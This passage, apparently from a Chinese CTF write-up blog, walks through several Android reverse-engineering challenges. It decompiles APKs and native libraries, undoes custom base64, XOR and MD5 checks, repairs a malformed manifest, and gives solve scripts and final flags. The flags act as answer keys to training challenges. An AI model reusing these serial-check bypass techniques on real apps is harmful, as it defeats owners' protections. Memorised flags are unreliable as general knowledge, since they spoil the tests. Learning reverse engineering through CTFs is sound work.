class="hljs-keyword">import</span> base64<br>m = [-<span class="hljs-number">120</span>, <span class="hljs-number">77</span>, -<span class="hljs-number">14</span>, -<span class="hljs-number">38</span>, <span class="hljs-number">17</span>, <span class="hljs-number">5</span>, -<span class="hljs-number">42</span>, <span class="hljs-number">44</span>, -<span class="hljs-number">32</span>, <span class="hljs-number">109</span>, <span class="hljs-number">85</span>, <span class="hljs-number">31</span>, <span class="hljs-number">24</span>, -<span class="hljs-number">91</span>, -<span class="hljs-number">112</span>, -<span class="hljs-number">83</span>,<br><span class="hljs-number">64</span>, -<span class="hljs-number">83</span>, -<span class="hljs-number">128</span>, <span class="hljs-number">84</span>, <span class="hljs-number">5</span>, -<span class="hljs-number">94</span>, -<span class="hljs-number">98</span>, -<span class="hljs-number">30</span>, <span class="hljs-number">18</span>, <span class="hljs-number">70</span>, -<span class="hljs-number">26</span>, <span class="hljs-number">71</span>, <span class="hljs-number">5</span>, -<span class="hljs-number">99</span>, -<span class="hljs-number">62</span>, -<span class="hljs-number">58</span>, <span class="hljs-number">117</span>, <span class="hljs-number">29</span>,<br>-<span class="hljs-number">44</span>, <span class="hljs-number">6</span>, <span class="hljs-number">112</span>, -<span class="hljs-number">4</span>, <span class="hljs-number">81</span>, <span class="hljs-number">84</span>, <span class="hljs-number">9</span>, <span class="hljs-number">22</span>, -<span class="hljs-number">51</span>, <span class="hljs-number">95</span>, -<span class="hljs-number">34</span>, <span class="hljs-number">12</span>, <span class="hljs-number">47</span>, <span class="hljs-number">77</span>]<br>data = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> m:<br>    data.append(i&amp;<span class="hljs-number">0xFF</span>)<br>    <span class="hljs-comment">#i&amp;0xFF 操作将有符号整数转换为无符号字</span><br><span class="hljs-built_in">print</span>(base64.b64encode(<span class="hljs-built_in">bytes</span>(data)))<br><br><span class="hljs-comment">#b&#x27;iE3y2hEF1izgbVUfGKWQrUCtgFQFop7iEkbmRwWdwsZ1HdQGcPxRVAkWzV/eDC9N&#x27;</span><br></code></pre></td></tr></table></figure><p>网站在线解密<br><img src="/../images/5/dex10.png"></p><blockquote><p>qwb{TH3y_Io&lt;e_EACh_OTh3r_FOrEUER}</p></blockquote><h3 id="easyjni"><a href="#easyjni" class="headerlink" title="easyjni"></a>easyjni</h3><p><strong>变种base64 算法逆向</strong> </p><ol><li>jadx 打开,看 MainACtivity ,关键方法：<br><code>a(String str)</code>方法</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">a</span><span class="hljs-params">(String str)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> ncheck(<span class="hljs-keyword">new</span> <span class="hljs-title class_">a</span>().a(str.getBytes()));<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>new a().a(str.getBytes()) 先对输入进行某种处理<br>然后调用 native 方法 ncheck() 进行验证<br><code>ncheck(String str)</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">ncheck</span><span class="hljs-params">(String str)</span>;<br></code></pre></td></tr></table></figure><p>声明了一个本地方法，实现在 libnative.so 中</p><p>查看 a 函数 ,可以分析推测出这是一个变种 base64<br><img src="/../images/5/jni1.png"></p><ol start="2"><li>分析 so 文件, ida 打开,找到<code>Java_com_a_easyjni_MainActivity_ncheck</code>,</li></ol><ul><li><code>v5 = (const char *)(*(int (__fastcall **)(int, int, _DWORD))(*(_DWORD *)a1 + 676))(a1, a3, 0);</code><br>这一行的等效代码为 <code>const char *input = (*env)-&gt;GetStringUTFChars(env, jstr, NULL);</code>,<br><code>+ 676</code>是 GetStringUTFChars 的偏移量</li><li>第一个循环 : 把输入字符串的前16位和后16位对调</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(input) == <span class="hljs-number">32</span> )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i != <span class="hljs-number">16</span>; ++i )<br>    &#123;<br>      v7 = &amp;v12[i];   <br>      v12[i] = input[i + <span class="hljs-number">16</span>];<br>      v8 = input[i];<br>      v7[<span class="hljs-number">16</span>] = v8;<br>    &#125;<br></code></pre></td></tr></table></figure><ul><li>第二个循环 ： 把每一对字符前后对调</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp">v9 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>    <br>      v13 = v12[v9];  <span class="hljs-comment">// v13 =v12[0] </span><br>      v12[v9] = v12[v9 + <span class="hljs-number">1</span>];  <span class="hljs-comment">//v12[0]=v12[1]</span><br>      v12[v9 + <span class="hljs-number">1</span>] = v13;  <span class="hljs-comment">//v12[1]=v13</span><br>      v9 += <span class="hljs-number">2</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>解题脚本</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">base64_str</span>):<br>    base64_charset = <span class="hljs-string">&quot;i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN&quot;</span><br>    base64_bytes = [<span class="hljs-string">&#x27;&#123;:0&gt;6&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(base64_charset.index(s))).replace(<span class="hljs-string">&#x27;0b&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)) <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> base64_str <span class="hljs-keyword">if</span><br>                    s != <span class="hljs-string">&#x27;=&#x27;</span>]<br>    resp = <span class="hljs-built_in">bytearray</span>()<br>    nums = <span class="hljs-built_in">len</span>(base64_bytes) // <span class="hljs-number">4</span><br>    remain = <span class="hljs-built_in">len</span>(base64_bytes) % <span class="hljs-number">4</span><br>    integral_part = base64_bytes[<span class="hljs-number">0</span>:<span class="hljs-number">4</span> * nums]<br><br>    <span class="hljs-keyword">while</span> integral_part:<br>        tmp_unit = <span class="hljs-string">&#x27;&#x27;</span>.join(integral_part[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br>        tmp_unit = [<span class="hljs-built_in">int</span>(tmp_unit[x: x + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">16</span>]]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tmp_unit:<br>            resp.append(i)<br>        integral_part = integral_part[<span class="hljs-number">4</span>:]<br><br>    <span class="hljs-keyword">if</span> remain:<br>        remain_part = <span class="hljs-string">&#x27;&#x27;</span>.join(base64_bytes[nums * <span class="hljs-number">4</span>:])<br>        tmp_unit = [<span class="hljs-built_in">int</span>(remain_part[i * <span class="hljs-number">8</span>:(i + <span class="hljs-number">1</span>) * <span class="hljs-number">8</span>], <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(remain - <span class="hljs-number">1</span>)]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tmp_unit:<br>            resp.append(i)<br><br>    <span class="hljs-keyword">return</span> resp<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    flag_1 = <span class="hljs-string">&#x27;MbT3sQgX039i3g==AQOoMQFPskB1Bsc7&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;加密后的字符串：&#x27;</span>,flag_1)<br>    <span class="hljs-comment"># 前后16位调换位置</span><br>    flag_2 = flag_1[<span class="hljs-built_in">len</span>(flag_1)//<span class="hljs-number">2</span>:] + flag_1[<span class="hljs-number">0</span>:<span class="hljs-built_in">len</span>(flag_1)//<span class="hljs-number">2</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;前后16位调换位置:&#x27;</span>,flag_2)<br>    flag_3 = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag_2)//<span class="hljs-number">2</span>):<br>        flag_3 += flag_2[i*<span class="hljs-number">2</span>+<span class="hljs-number">1</span>] + flag_2[i*<span class="hljs-number">2</span>]<br>      <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;前后两位调换位置：&#x27;</span>,flag_3)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;解密后：&#x27;</span>,decode(flag_3))<br><br><span class="hljs-comment"># 加密后的字符串： MbT3sQgX039i3g==AQOoMQFPskB1Bsc7</span><br><span class="hljs-comment"># 前后16位调换位置: AQOoMQFPskB1Bsc7MbT3sQgX039i3g==</span><br><span class="hljs-comment"># 前后两位调换位置： QAoOQMPFks1BsB7cbM3TQsXg30i9g3==</span><br><span class="hljs-comment"># 解密后： bytearray(b&#x27;flag&#123;just_ANot#er_@p3&#125;&#x27;)</span><br></code></pre></td></tr></table></figure><blockquote><p>flag{just_ANot#er_@p3}</p></blockquote><h3 id="easyjava"><a href="#easyjava" class="headerlink" title="easyjava"></a>easyjava</h3><p><strong>算法逆向</strong></p><ol><li><code>jadx</code>打开,分析 MainActivity,主要逻辑大概是先提取中间部分(去除flag{}),然后对传入的每个字符调用a()方法,而a()方法中是先调用b.a(str)，再调用a.a(结果)<br><img src="/../images/5/ezjava1.png"></li><li>看 a 类和 b 类,主逻辑分别是将传入的整数返回对应的映射字符,以及传入的字符返回对应的映射整数</li><li>解密脚本</li></ol><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs py">cipherText = <span class="hljs-string">&#x27;wigwrkaugala&#x27;</span><br><br>aArray = [<span class="hljs-number">21</span>,<span class="hljs-number">4</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">20</span>,<span class="hljs-number">5</span>,<span class="hljs-number">15</span>,<span class="hljs-number">9</span>,<span class="hljs-number">17</span>,<span class="hljs-number">6</span>,<span class="hljs-number">13</span>,<span class="hljs-number">3</span>,<span class="hljs-number">18</span>,<span class="hljs-number">12</span>,<span class="hljs-number">10</span>,<span class="hljs-number">19</span>,<span class="hljs-number">0</span>,<span class="hljs-number">22</span>,<span class="hljs-number">2</span>,<span class="hljs-number">11</span>,<span class="hljs-number">23</span>,<span class="hljs-number">1</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">14</span>,<span class="hljs-number">16</span>]<br>aString = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span><br><br>bArray = [<span class="hljs-number">17</span>,<span class="hljs-number">23</span>,<span class="hljs-number">7</span>,<span class="hljs-number">22</span>,<span class="hljs-number">1</span>,<span class="hljs-number">16</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">21</span>,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>,<span class="hljs-number">5</span>,<span class="hljs-number">10</span>,<span class="hljs-number">18</span>,<span class="hljs-number">2</span>,<span class="hljs-number">24</span>,<span class="hljs-number">4</span>,<span class="hljs-number">11</span>,<span class="hljs-number">3</span>,<span class="hljs-number">14</span>,<span class="hljs-number">19</span>,<span class="hljs-number">12</span>,<span class="hljs-number">20</span>,<span class="hljs-number">13</span>,<span class="hljs-number">8</span>,<span class="hljs-number">25</span>]<br>bString = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">changeBArrayandString</span>():<br><span class="hljs-keyword">global</span> bString<br><span class="hljs-keyword">global</span> bArray<br>chArray = bArray[<span class="hljs-number">0</span>]<br>chString = bString[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>]<br><span class="hljs-comment">#切片 [0:1] 保留原始类型（bytes），而索引 [0] 返回的是整数值</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(bArray) - <span class="hljs-number">1</span>):<br>bArray[i] = bArray[i + <span class="hljs-number">1</span>]<br>bArray[<span class="hljs-built_in">len</span>(bArray) - <span class="hljs-number">1</span>] = chArray<br>bString = bString[<span class="hljs-number">1</span>:]<br>bString += chString<br><span class="hljs-comment">#分别把bString和bArray中的每一个元素往前移动一位，首位元素放到末尾</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getBchar</span>(<span class="hljs-params">ch</span>):<br><span class="hljs-comment">#根据输入的整数ch获取对应的字符</span><br>v2 = bArray[ch]<br><span class="hljs-comment">#使用ch作为索引,获取bArray中的对应元素</span><br>arg = bString[v2]<br><span class="hljs-comment">#使用v2作为索引,获取bString中的对应元素</span><br>changeBArrayandString()<br><span class="hljs-keyword">return</span> arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getAint</span>(<span class="hljs-params">ch</span>):<br><span class="hljs-comment">#根据输入的字符ch获取对应的整数</span><br><span class="hljs-keyword">global</span> aString<br><span class="hljs-keyword">global</span> aArray<br>v1 = aString.index(ch)<br><span class="hljs-comment">#获取对应字符的索引</span><br>arg5 = aArray[v1]<br><span class="hljs-keyword">return</span> arg5<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;flag&#123;&#x27;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> cipherText:<br><span class="hljs-comment">#先得到密文的索引</span><br>v0 = getAint(k)<br><span class="hljs-built_in">print</span>(getBchar(v0),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="android-2-0"><a href="#android-2-0" class="headerlink" title="android 2.0"></a>android 2.0</h3><p><strong>算法逆向</strong></p><ol><li>将apk文件放入<code>jadx</code>中,源代码里面找到<code>MainActiviy</code>,找到关键部分函数<br><img src="/../images/5/3.png" alt="mainactivity"></li></ol><ul><li>这段代码的功能：</li></ul><p>这段代码实现了一个简单的 Android 应用,它有一个按钮、一个文本框和一个显示结果的文本。<br>用户在文本框(EditText)里输入一个字符串(可能是密码),<br>然后点击按钮时,代码会调用一个名为 JNI.getResult(str) 的本地方法来判断密码是否正确</p><p>如果 JNI.getResult(str) 返回 0,界面会显示 “Wrong”<br>如果 JNI.getResult(str) 返回 1,界面会显示 “Great”</p><p>点进<code>JNI</code><br><img src="/../images/5/4.png" alt="mainactivity2"></p><p>关键部分是 JNI.getResult(str):<br>JNI.getResult(str) 是一个 本地方法，也就是说，它的实现并不在 Java 代码里，而是在 C&#x2F;C++ 代码中，并且通过 JNI(Java Native Interface)被调用。</p><p>这意味着需要分析那个本地的<code>.so文件</code>,找出这个getResult 方法的实现<br>2. 修改后缀,将.apk改成.zip,解压后找到.so文件,把<code>libNative.so</code>用<code>IDA</code>打开,找到几个关键函数<br>   <img src="/../images/5/6.png" alt=".so"><br>3. </p><ul><li>分析<code>First</code>函数<br>   <img src="/../images/5/7.png" alt="First"><br>   还原：先异或0x80，再除以2</li></ul>   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">First</span>():<br>     enc=<span class="hljs-string">&quot;LN^dl&quot;</span><br>     dec=<span class="hljs-string">&quot;&quot;</span><br>     <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">4</span>):<br>         dec+=(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>((<span class="hljs-built_in">ord</span>(enc[i])^<span class="hljs-number">0x80</span>)/<span class="hljs-number">2</span>)))<br>     dec+=<span class="hljs-string">&#x27;l&#x27;</span><br>     <span class="hljs-built_in">print</span>(dec)<br>First()<br> <span class="hljs-comment">#fgorl</span><br></code></pre></td></tr></table></figure><ul><li>分析<code>Second</code>函数<br>  <img src="/../images/5/8.png" alt="second"><br>  直接异或还原</li></ul>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">second</span>():<br>  a5=[<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27; &#x27;</span>),<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;5&#x27;</span>),<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;-&#x27;</span>),<span class="hljs-number">0x16</span>,<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)]<br>  a1=[<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;L&#x27;</span>),<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;N&#x27;</span>),<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;^&#x27;</span>),<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;d&#x27;</span>),<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;l&#x27;</span>)]<br>  s1=<span class="hljs-string">&quot;&quot;</span><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">4</span>):<br>      x=a5[i]^a1[i]<br>      s1+=<span class="hljs-built_in">chr</span>(x)<br>  s1+=<span class="hljs-string">&#x27;a&#x27;</span><br>  <span class="hljs-built_in">print</span>(s1)<br>second()<br><span class="hljs-comment">#l&#123;sra</span><br></code></pre></td></tr></table></figure><ul><li><code>Third</code>同理<br>  <img src="/../images/5/9.png" alt="third"><br>  如果v6&#x3D;a5就执行异或操作，所以v6&#x3D;a5</li></ul>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"> <span class="hljs-keyword">def</span> <span class="hljs-title function_">third</span>():<br>    a5 = [<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27; &#x27;</span>), <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;5&#x27;</span>), <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;-&#x27;</span>), <span class="hljs-number">0x16</span>, <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)]<br>    dec = [<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>), <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;F&#x27;</span>), <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;B&#x27;</span>), <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;o&#x27;</span>), <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;&#125;&#x27;</span>)]<br>    enc = <span class="hljs-string">&quot;&quot;</span>  <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>):<br>        x = a5[i] ^ dec[i]<br>        enc += <span class="hljs-built_in">chr</span>(x)<br>    enc += <span class="hljs-string">&#x27;&#125;&#x27;</span><br>    <span class="hljs-built_in">print</span>(enc)<br><br>third()<br><span class="hljs-comment">#asoy&#125;</span><br></code></pre></td></tr></table></figure><ul><li>由<code>Init</code>函数还原flag</li><li>Init函数是将输入的长度为15的字符串，每三个为一组，得到三组字符串（即刚刚解出的三组数据）</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>():<br>  s1=<span class="hljs-string">&quot;fgorl&quot;</span><br>  s2=<span class="hljs-string">&quot;l&#123;sra&quot;</span><br>  s3=<span class="hljs-string">&quot;asoy&#125;&quot;</span><br>  flag=<span class="hljs-string">&quot;&quot;</span><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">5</span>):<br>     flag+=s1[i]+s2[i]+s3[i]<br>  <span class="hljs-built_in">print</span>(flag)<br>decode()<br><span class="hljs-comment">#flag&#123;sosorryla&#125;</span><br></code></pre></td></tr></table></figure><blockquote><p>flag{sosorryla}</p></blockquote><h3 id="基础android"><a href="#基础android" class="headerlink" title="基础android"></a>基础android</h3><p><strong>用misc方法解题了</strong></p><ol><li>将apk文件放入<code>010editor</code>中，发现文件头是<strong>50 4B 03 04</strong>是zip文件,修改后缀,解压<br><img src="/../images/5/1.png" alt="解压"></li><li>在assets文件夹下发现<code>time_2.zip</code>,放入<code>010editor</code>，文件头是<strong>FF D8 FF</strong>,jpg文件,修改后缀,打开后是一张图片<img src="/../images/5/2.jpg" alt="flag"><blockquote><p>flag{08067-wlecome}</p></blockquote></li></ol><h3 id="APK逆向"><a href="#APK逆向" class="headerlink" title="APK逆向"></a>APK逆向</h3><ol><li>打开apk文件,用<code>jadx</code>打开，找到关键<code>MainActiivty</code>,<br>注意到<code>edit_sn</code>和<code>edit_userName</code>,找到<code>edit_userName = &quot;Tenshine&quot;</code>,</li><li>在<code>CheckSN</code>中看到代码逻辑<br><img src="/../images/5/10.png" alt="checksn"><br>md5加密,转为hex字符,for循环注意<strong>i+&#x3D;2</strong></li><li>解题脚本</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-built_in">str</span>=<span class="hljs-string">b&quot;Tenshine&quot;</span><br>str1=hashlib.md5(<span class="hljs-built_in">str</span>).hexdigest()<br>flag=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(str1)):<br>    <span class="hljs-keyword">if</span>(i%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>):<br>        flag+=str1[i]<br><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#bc72f242a6af3857a</span><br></code></pre></td></tr></table></figure><p>flag为</p><blockquote><p>bc72f242a6af3857a</p></blockquote><h3 id="APK逆向-2"><a href="#APK逆向-2" class="headerlink" title="APK逆向-2"></a>APK逆向-2</h3><ol><li>用 jadx 打开后发现<code>AndroidManifest</code>反编译失败,改 apk 后缀为 zip ,解压后把<code>AndroidManifest</code>放进 010editor ,发现有两处错误<br><img src="/../images/5/14.png"><br>第一处 ： Chunk Type : 4 bytes，始终为 0x001c0001<br>第二处 ： Unkown : 4 bytes,固定值，0x00000000</li><li>修改之后<br><img src="/../images/5/13.png"></li><li>把修改后的文件重新压缩,再改后缀 zip 为 apk ,重新放进jadx中打开可以看到<code>AndroidManifest</code>可以被成功反编译了，flag即出<blockquote><p>8d6efd232c63b7d2</p></blockquote></li></ol><h3 id="app1"><a href="#app1" class="headerlink" title="app1"></a>app1</h3><ol><li>用<code>jadx</code>打开，<code>MainAvtivity</code>里面发现有个<code>versionCode</code>和<code>versionName</code>,在<code>BuildConfig</code>里面看到关键信息<br><img src="/../images/5/11.png" alt="buildconfig"></li><li>将apk在模拟器上运行，会发现随便输入会弹出“再接再厉，加油~”，不输入会弹出“”年轻人不要耍小聪明噢”,结合代码梳理出逻辑：</li></ol><p>先检查 inputString 是否满足 versionCode.charAt(i) ^ versionName 规则<br>再检查长度是否相等<br>两者同时满足，显示 “恭喜开启闯关之门！”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">versionName=<span class="hljs-string">&quot;X&lt;cP[?PHNB&lt;P?aj&quot;</span><br>versionCode=<span class="hljs-number">15</span><br>flag=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(versionName)):<br>   flag+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(versionName[i])^versionCode)<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#W3l_T0_GAM3_0ne</span><br></code></pre></td></tr></table></figure><p>flag为</p><blockquote><p>W3l_T0_GAM3_0ne</p></blockquote><h3 id="app3"><a href="#app3" class="headerlink" title="app3"></a>app3</h3><ol><li>下载附件后是一个 .ab 文件,这是安卓备份格式的文件,它分为加密和未加密两种类型,.ab 文件的前 24 个字节是类似文件头的东西，如果是加密的,在前 24 个字节中会有 AES-256 的标志,如果未加密,则在前 24 个字节中会有 none 的标志;对于没有加密的ab 文件,可以用以下指令解压<br><code>java -jar abp.jar unpack app3.ab app3.jar</code><br>解压后可以看到里面有一个 base.apk,还有两个数据库文件,用DB Browser打开发现是加密的,需要去找密钥</li><li>把app3.jar 直接用 jadx 打开,找到MainActivity,注意到在 OnCreate之后调用了函数a</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span 